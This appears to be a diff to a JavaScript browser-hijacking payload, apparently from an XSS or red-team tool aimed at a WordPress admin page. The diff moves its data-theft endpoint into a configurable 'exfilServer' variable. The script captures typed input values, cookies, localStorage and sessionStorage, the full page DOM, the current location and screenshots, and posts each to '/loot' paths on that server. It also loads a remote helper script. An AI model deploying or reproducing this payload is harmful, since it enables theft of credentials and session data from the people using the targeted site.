@@ -26,6 +26,9 @@ let setBackgroundImage = true;
 let startingPage = "https://targetapp.possiblymalware.com/wp-admin";
 
 
+// Exfil server
+let exfilServer = "http://localhost:8444";
+
 // Should we exfil the entire DOM?
 let exfilDOM = true;
 
@@ -168,7 +171,7 @@ function sendScreenshot()
 
 		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
-		request.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
+		request.open("POST", exfilServer + "/loot/screenshot/" + sessionName);
 
 
 		// Helps hide flashing of the page when clicking around
@@ -216,7 +219,7 @@ function hookInputs()
 				inputName = this.name;
 				inputValue = this.value;
 				request = new XMLHttpRequest();
-				request.open("POST", "http://localhost:8444/loot/input/" + sessionName);
+				request.open("POST", exfilServer + "/loot/input/" + sessionName);
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -272,7 +275,7 @@ function checkCookies()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
+		request.open("POST", exfilServer + "/loot/dessert/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -323,7 +326,7 @@ function checkLocalStorage()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", "http://localhost:8444/loot/localstore/" + sessionName);
+		request.open("POST", exfilServer + "/loot/localstore/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -375,7 +378,7 @@ function checkSessionStorage()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", "http://localhost:8444/loot/sessionstore/" + sessionName);
+		request.open("POST", exfilServer + "/loot/sessionstore/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -397,7 +400,7 @@ function sendDOM()
 	// console.log(trapDom)
 
 	request = new XMLHttpRequest();
-	request.open("POST", "http://localhost:8444/loot/dom/" + sessionName);
+	request.open("POST", exfilServer + "/loot/dom/" + sessionName);
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -433,7 +436,7 @@ function runUpdate()
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
 		request = new XMLHttpRequest();
-		request.open("POST", "http://localhost:8444/loot/location/" + sessionName);
+		request.open("POST", exfilServer + "/loot/location/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["url"] = fullUrl;
@@ -547,7 +550,7 @@ document.body.outerHTML = "";
 // Pull in html2canvas
 var js = document.createElement("script");
 js.type = "text/javascript";
-js.src = "http://localhost:8444/lib/telemhelperlib.js";
+js.src = exfilServer + "/lib/telemhelperlib.js";
 document.body.appendChild(js);
 
 
